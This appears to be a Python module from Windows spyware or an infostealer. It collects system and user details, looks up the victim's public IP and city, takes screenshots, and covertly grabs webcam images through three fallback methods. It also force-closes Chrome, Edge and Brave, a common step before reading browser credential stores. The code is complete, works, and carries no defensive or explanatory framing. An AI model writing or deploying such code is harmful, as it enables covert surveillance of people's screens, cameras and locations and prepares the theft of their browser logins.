import os
import platform
import socket
import subprocess
import time
import ctypes
import sys

try:
    import psutil
except:
    psutil = None

try:
    import requests
except:
    requests = None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def get_ip():
    try:
        if requests is None:
            return "Unknown"
        return requests.get('https://api.ipify.org', timeout=5).text.strip()
    except:
        return "Unknown"

def get_location():
    try:
        if requests is None:
            return "Unknown"
        ip = get_ip()
        if ip == "Unknown":
            return "Unknown"
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = r.json()
        return f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
    except:
        return "Unknown"

def get_system_info():
    try:
        hostname = platform.node() or "Unknown"
        os_info = f"{platform.system()} {platform.release()}"
        if psutil:
            cpu = f"{psutil.cpu_count()} cores ({psutil.cpu_percent(interval=1)}%)"
            ram_total = psutil.virtual_memory().total / (1024**3)
            ram_percent = psutil.virtual_memory().percent
            disk_free = psutil.disk_usage('/').free / (1024**3)
            ram_s = f"{ram_total:.1f} GB ({ram_percent}%)"
            disk_s = f"{disk_free:.1f} GB free"
        else:
            cpu = "Unknown"
            ram_s = "Unknown"
            disk_s = "Unknown"
        try:
            user = os.getlogin()
        except:
            user = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
        return {
            'hostname': hostname,
            'os': os_info,
            'cpu': cpu,
            'ram': ram_s,
            'disk': disk_s,
            'ip': get_ip(),
            'location': get_location(),
            'user': user,
            'admin': 'Yes' if is_admin() else 'No'
        }
    except:
        return {
            'hostname': 'Unknown',
            'os': 'Unknown',
            'cpu': 'Unknown',
            'ram': 'Unknown',
            'disk': 'Unknown',
            'ip': get_ip(),
            'location': get_location(),
            'user': 'Unknown',
            'admin': 'No'
        }

def take_screenshot():
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        path = os.path.join(os.environ.get('TEMP', os.getcwd()), 'screenshot.png')
        screenshot.save(path)
        return path
    except:
        return None

def capture_webcam():
    try:
        import cv2
        for idx in [0, 1]:
            cap = None
            try:
                cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
                if not cap.isOpened():
                    try:
                        cap.release()
                    except:
                        pass
                    continue
                time.sleep(0.7)
                try:
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                except:
                    pass
                ret, frame = cap.read()
                if not ret or frame is None:
                    time.sleep(0.3)
                    ret, frame = cap.read()
                if ret and frame is not None and frame.size > 0:
                    path = os.path.join(os.environ.get('TEMP', '.'), f'webcam_{idx}.png')
                    success = cv2.imwrite(path, frame)
                    cap.release()
                    if success and os.path.exists(path) and os.path.getsize(path) > 2048:
                        return path
                    try:
                        if os.path.exists(path):
                            os.remove(path)
                    except:
                        pass
                try:
                    cap.release()
                except:
                    pass
            except:
                try:
                    if cap is not None:
                        cap.release()
                except:
                    pass
                continue
    except Exception:
        pass

    try:
        from ctypes import wintypes
        WM_CAP_DRIVER_CONNECT = 0x40A
        WM_CAP_DRIVER_DISCONNECT = 0x40B
        WM_CAP_GRAB_FRAME = 0x43C
        WM_CAP_FILE_SAVEDIBA = 0x419
        avicap = ctypes.windll.avicap32
        user32 = ctypes.windll.user32
        cap_wnd = avicap.capCreateCaptureWindowA(b"webcam", 0, 0, 0, 640, 480, 0, 0)
        if cap_wnd:
            if user32.SendMessageA(cap_wnd, WM_CAP_DRIVER_CONNECT, 0, 0):
                time.sleep(0.8)
                user32.SendMessageA(cap_wnd, WM_CAP_GRAB_FRAME, 0, 0)
                time.sleep(0.4)
                tmp_path = os.path.join(os.environ.get('TEMP', '.'), 'webcam_avicap.bmp')
                res = user32.SendMessageA(cap_wnd, WM_CAP_FILE_SAVEDIBA, 0, tmp_path.encode('utf-8', errors='ignore'))
                user32.SendMessageA(cap_wnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
                user32.DestroyWindow(cap_wnd)
                if res and os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 2048:
                    try:
                        from PIL import Image
                        png_path = tmp_path.replace('.bmp', '.png')
                        with Image.open(tmp_path) as im:
                            im.save(png_path, 'PNG')
                        os.remove(tmp_path)
                        return png_path
                    except:
                        return tmp_path
            else:
                try:
                    user32.DestroyWindow(cap_wnd)
                except:
                    pass
    except Exception:
        pass

    try:
        tmp_path = os.path.join(os.environ.get('TEMP', '.'), 'webcam_ffmpeg.png')
        for cam_name in ['Integrated Camera', 'USB Camera', 'Webcam', 'Camera']:
            try:
                subprocess.run(
                    ['ffmpeg', '-f', 'dshow', '-i', f'video="{cam_name}"', '-frames:v', '1', '-y', tmp_path],
                    capture_output=True, timeout=5
                )
                if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 2048:
                    return tmp_path
            except:
                continue
    except:
        pass
    return None

def close_browsers():
    try:
        os.system('taskkill /f /im chrome.exe >nul 2>&1')
        os.system('taskkill /f /im msedge.exe >nul 2>&1')
        os.system('taskkill /f /im brave.exe >nul 2>&1')
        time.sleep(2)
        return True
    except:
        return False
